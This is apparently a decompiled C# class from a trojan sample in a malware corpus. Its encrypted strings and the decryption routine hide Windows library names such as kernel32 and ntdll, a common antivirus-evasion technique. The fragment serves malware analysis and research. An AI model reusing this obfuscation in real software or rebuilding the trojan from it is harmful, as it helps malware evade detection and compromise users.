// Decompiled with JetBrains decompiler
// Type: AvG.Crpt
// Assembly: AvG, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: EE6413DF-98D6-4E13-8F62-503CC608F960
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Trojan.Win32.Siscos.egt-960843e504290c60dad25d95c76dfe3e1bb44d2b0269a422230476d2d455f21a.exe

using Microsoft.VisualBasic.CompilerServices;
using System.Text;

namespace AvG
{
  [StandardModule]
  internal sealed class Crpt
  {
    public static string CLczAvLEockgBlBrgipM = Crpt.Decrypt("mhvsks;;");
    public static string FHktbfWmkuUpWnSdfwBk = Crpt.Decrypt("IhxYnymjnN{{#t)&");
    public static string JbTdgWmysQeyxnlupgNu = Crpt.Decrypt("TheiVywlo~ Zs| $,");
    public static string SdNDojuAlDqzxbXkFiwU = Crpt.Decrypt("pwhqr");
    public static string UfhTkfkZtXzZbhbgztyW = Crpt.Decrypt("\\zYsshx_sp$\\tbut'|$$");
    public static string MapIafAjlncAzQceUjys = Crpt.Decrypt("Xlvy{htJvw{pS(");
    public static string QfxWabBltMcxatYnHsSa = Crpt.Decrypt("YumykWzxmp ![t}!%-");
    public static string OoUqnlItkfptWiaTkmRb = Crpt.Decrypt("Xlvy{htY|z!rq$U*");
    public static string PxvqKcCzBMikwQwmyTQe = Crpt.Decrypt("UhxYnymjnN{{#t)&");
    public static string EitcQNulIkfOXkpKymqt = Crpt.Decrypt("Thwzsl\\q|pmq");

    private static string Decrypt(string encryptedtext)
    {
      byte[] bytes = Encoding.UTF8.GetBytes(encryptedtext);
      int num1 = checked (bytes.Length - 1);
      int index1 = 0;
      while (index1 <= num1)
      {
        if (bytes[index1] > (byte) 31 & bytes[index1] < (byte) 127)
        {
          byte[] numArray = bytes;
          int index2 = index1;
          int index3 = index2;
          int num2 = (int) checked ((byte) unchecked ((int) bytes[index2] - (int) checked ((byte) (unchecked (index1 % 31) + 2))));
          numArray[index3] = (byte) num2;
        }
        if (bytes[index1] < (byte) 32)
        {
          byte[] numArray = bytes;
          int index4 = index1;
          int index5 = index4;
          int num3 = (int) checked ((byte) unchecked ((int) bytes[index4] + 95));
          numArray[index5] = (byte) num3;
        }
        checked { ++index1; }
      }
      return Encoding.UTF8.GetString(bytes);
    }
  }
}
